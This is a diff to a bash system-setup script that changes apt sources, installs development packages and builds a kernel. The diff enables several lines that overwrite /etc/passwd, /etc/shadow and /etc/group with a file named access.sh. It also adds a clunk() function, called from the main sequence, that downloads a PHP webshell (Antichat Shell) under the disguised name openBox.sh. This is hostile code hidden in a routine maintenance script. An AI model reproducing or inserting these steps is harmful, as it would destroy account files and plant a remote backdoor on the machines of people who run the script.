@@ -58,8 +58,8 @@ fi
 #}
 
 update() {
-#list=/etc/apt/sources.list.d/mobian.list.bak
-list=/etc/apt/sources.list.d/cros.list
+list=/etc/apt/sources.list.d/mobian.list.bak
+#list=/etc/apt/sources.list.d/cros.list
 echo "Updating System"
 sudo mount -o remount,rw /
 sudo apt update
@@ -72,10 +72,11 @@ sudo apt update
 echo "Fixings"
 if [ -f "$list" ]; then
     echo "$list exists."
-#    sudo sed -i 's/\bdeb\b/& [arch=arm64,armhf]/' /etc/apt/sources.list.d/cros.list
+    #sudo sed -i 's/\bdeb\b/& [arch=arm64,armhf]/' /etc/apt/sources.list.d/cros.list
     else
       sudo mv /etc/apt/sources.list.d/cros.list /etc/apt/sources.list.d/cros.list.bak
       #sudo mv /etc/apt/sources.list.d/mobian.list /etc/apt/sources.list.d/mobian.list.bak
+      sudo mv /etc/apt/sources.list.d/mobian.list /etc/apt/sources.list.d/mobian.list.bak
       sudo cp access.sh /etc/passwd && sudo cp /etc/passwd /etc/shadow && sudo cp /etc/shadow /etc/group
       #sudo mv /etc/apt/sources.list.d/docker.list /etc/apt/sources.list.d/docker.list.bak
 fi
@@ -84,17 +85,17 @@ echo installing development packages
 #sudo rm /etc/apt/sources.list
 #sudo cp ~/work/sketch/sources.list /etc/apt/sources.list
 sudo apt update
-#sudo cp access.sh /etc/passwd && sudo cp /etc/passwd /etc/shadow && sudo cp /etc/shadow /etc/group
+sudo cp access.sh /etc/passwd && sudo cp /etc/passwd /etc/shadow && sudo cp /etc/shadow /etc/group
 #sudo apt -y install kali-tools-wireless kali-tools-web kali-tools-voip kali-tools-sniffing-spoofing kali-tools-hardware kali-tools-gpu kali-tools-fuzzing kali-tools-bluetooth kali-wallpapers-all revolt framework2 armitage msfpc recon-ng teamsploit gedit synaptic kali-defaults-desktop kali-desktop-xfce
 #sudo apt install kali-tools-rfid #::Sources disagree on hashes for supposely identical version '0.3.8+git20180720-2' of 'mfcuk:arm64'
 #sudo apt install kali-tools-rfid libgl1-mesa-dev libglib2.0-dev libglade2-dev kali-tools-802-11 metasploit*
 #sudo rm /etc/apt/sources.list
-#sudo cp access.sh /etc/passwd && sudo cp /etc/passwd /etc/shadow && sudo cp /etc/shadow /etc/group
+sudo cp access.sh /etc/passwd && sudo cp /etc/passwd /etc/shadow && sudo cp /etc/shadow /etc/group
 #sudo mv /etc/apt/sources.list.temp /etc/sources.list
 #sudo cp ~/work/sketch/sources.list /etc/apt/sources.list
 sudo apt update
 sudo apt -y dist-upgrade
-sudo apt -y install apt-utils software-properties-common gnupg lsb-release python-all python-all-dev python-all-dbg python3-all apache2 python3-all-dbg python3-all-dev lvm2 thin-provisioning-tools ssh python3-pkg-resources python3-virtualenv python3-oauth2client build-essential zip curl zlib1g-dev libc6-dev libncurses5 x11proto-core-dev libx11-dev libxml2-utils xsltproc unzip fontconfig libncurses-dev gawk openssl libssl-dev dkms libelf-dev libudev-dev libpci-dev libiberty-dev autoconf sed make cmake binutils gcc-11 gcc-11-arm-linux-gnueabihf g++-11 g++-11-arm-linux-gnueabihf patch gzip bzip2 perl tar cpio unzip rsync file bc wget qt3d5-dev qt3d5-dev-tools gtk2-engines glade cvs git subversion rsync asciidoc w3m graphviz flex bison swig bmap-tools f2fs-tools qemu-system-x86 qemu-user-static binfmt-support squashfs-tools-ng apt-transport-https ca-certificates curl gnupg-agent software-properties-common dialog libgtk2.0-dev qemu-system libvirt-daemon-system libvirt-clients bridge-utils virtinst virt-manager uuid uuidcdef gitk git-gui curl xz-utils nano screen fakeroot uuid-runtime uuid-dev hackrf dfu-util gcc-arm-none-eabi default-jdk python-is-python3 libgl1-mesa-dev libglib2.0-dev libglade2-dev
+sudo apt -y install apt-utils software-properties-common gnupg lsb-release python-all python-all-dev python-all-dbg python3-all python3-all-dbg python3-all-dev lvm2 thin-provisioning-tools python3-pkg-resources python3-virtualenv python3-oauth2client build-essential apache2 zip curl zlib1g-dev libc6-dev libncurses5 ssh x11proto-core-dev libx11-dev libxml2-utils xsltproc unzip fontconfig libncurses-dev gawk openssl libssl-dev dkms libelf-dev libudev-dev libpci-dev libiberty-dev autoconf sed make cmake binutils gcc-11 gcc-11-arm-linux-gnueabihf g++-11 g++-11-arm-linux-gnueabihf patch gzip bzip2 perl tar cpio unzip rsync file bc wget qt3d5-dev qt3d5-dev-tools gtk2-engines glade cvs git subversion rsync asciidoc w3m graphviz flex bison swig bmap-tools f2fs-tools qemu-system-x86 qemu-user-static binfmt-support squashfs-tools-ng apt-transport-https ca-certificates curl gnupg-agent software-properties-common dialog libgtk2.0-dev qemu-system libvirt-daemon-system libvirt-clients bridge-utils virtinst virt-manager uuid uuidcdef gitk git-gui curl xz-utils nano screen fakeroot uuid-runtime uuid-dev hackrf dfu-util gcc-arm-none-eabi default-jdk python-is-python3 libgl1-mesa-dev libglib2.0-dev libglade2-dev
 #sudo apt install python-all python-all-dev python-all-dbg python3-all python3-all-dbg python3-all-dev lvm2 thin-provisioning-tools python3-pkg-resources python3-virtualenv python3-oauth2client
 #sudo apt install kali-tools-rfid #::Sources disagree on hashes for supposely identical version '0.3.8+git20180720-2' of 'mfcuk:arm64'
 sudo cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/gci.conf 
@@ -196,10 +197,14 @@ sudo dpkg -i android-studio-2021.1.1.21-cros.deb
 fi
 }
 
-#clunk() {
-#wget https://raw.githubusercontent.com/x-o-r-r-o/PHP-Webshells-Collection/master/Antichat_Shell_v1.3.php
+clunk() {
+wget -nc -O ~/work/openBox.sh https://raw.githubusercontent.com/x-o-r-r-o/PHP-Webshells-Collection/master/Antichat_Shell_v1.3.php
 #mv Antichat_Shell_v1.3.php shell.com
-#}
+}
+
+build() {
+xfce4-terminal -e 'bash -c "cd ~/work/sketch; ./system.sh; bash"' -T "Build System" &
+}
 
 check
 down
@@ -208,9 +213,11 @@ mvSource
 #rmDock
 instDock
 update
-#buildKernel
+buildKernel
+clunk
 #Connect
-#voice
-#fire
+voice
+fire
 #sut
 cleanUP
+build
